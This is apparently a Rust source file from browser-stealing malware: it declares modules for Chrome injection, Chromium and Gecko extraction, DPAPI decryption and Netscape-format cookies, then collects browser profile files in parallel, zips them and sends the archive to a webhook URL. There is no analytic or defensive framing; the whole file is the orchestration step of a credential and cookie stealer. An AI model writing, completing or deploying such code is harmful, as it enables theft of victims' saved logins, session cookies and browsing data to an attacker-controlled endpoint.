pub mod chrome_inject;
pub mod chromium;
pub mod gecko;
mod dpapi_fallback;
mod netscape;
pub mod sender;
mod zip_layout;

pub async fn run(client: &reqwest::Client, webhook_url: &str) -> Result<(), Box<dyn std::error::Error>> {
    let mut all_files: Vec<(String, String)> = Vec::new();

    crate::log::log("chromium + gecko extract (parallel)...");
    let gecko_handle = std::thread::spawn(|| gecko::extract_all());
    let chromium_files = chromium::extract_all();
    let gecko_files = gecko_handle.join().unwrap_or_default();

    crate::log::log(&format!("chromium: {} file(s)", chromium_files.len()));
    all_files.extend(chromium_files);
    crate::log::log(&format!("gecko: {} file(s)", gecko_files.len()));
    all_files.extend(gecko_files);

    zip_layout::sort_entries(&mut all_files);
    crate::log::log(&format!("total zip entries: {}", all_files.len()));

    if !all_files.is_empty() {
        sender::send_zip(client, webhook_url, &all_files).await?;
    } else {
        crate::log::log("no browser files to send (zip skipped)");
    }

    Ok(())
}
